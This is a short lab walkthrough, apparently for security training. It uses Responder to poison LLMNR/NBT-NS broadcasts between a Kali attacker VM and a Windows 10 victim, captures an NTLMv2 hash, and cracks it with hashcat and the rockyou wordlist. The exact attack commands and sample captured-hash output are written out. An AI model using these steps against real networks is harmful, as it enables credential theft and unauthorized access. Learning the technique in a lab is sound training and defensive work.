# Responder - Practical Lab

## Objective
Capture an NTLMv2 hash by poisoning LLMNR/NBT-NS broadcast requests on a local network.

## Environment
- **Attacker VM:** Kali Linux (IP: 192.168.1.100)
- **Victim VM:** Windows 10 (IP: 192.168.1.105) - Ensure they are on the same local subnet.

## Scenario Steps

### Step 1: Start Responder (Attacker)
On the Kali Linux machine, identify your network interface (e.g., `eth0`) and start Responder.
```bash
sudo responder -I eth0 -dwv
```
*(Options: `-d` enables DHCP responses, `-w` enables WPAD rogue proxy, `-v` is verbose. Standard `sudo responder -I eth0` is also sufficient).*
Keep the terminal open and observe the output. Responder is now listening for broadcast queries.

### Step 2: Trigger a Query (Victim)
Log into the Windows 10 victim machine. We will simulate a user mistyping a network share.
1. Open Windows File Explorer.
2. In the address bar, type a non-existent network share, for example: `\\nonexistentshare`
3. Press Enter. Windows will try DNS, fail, and then broadcast using LLMNR/NBT-NS.

### Step 3: Capture the Hash (Attacker)
Switch back to the Kali Linux terminal running Responder.
You should see output indicating that Responder intercepted the request for `nonexistentshare` and successfully captured the NTLMv2 hash for the user logged into the Windows 10 machine.
The output will look similar to:
```
[SMB] NTLMv2-SSP Client   : 192.168.1.105
[SMB] NTLMv2-SSP Username : WIN10\VictimUser
[SMB] NTLMv2-SSP Hash     : VictimUser::WIN10:1122334455667788:0000000...
```

### Step 4: Offline Cracking
Copy the captured hash string into a text file named `hash.txt`.
Use Hashcat to attempt to crack the password:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
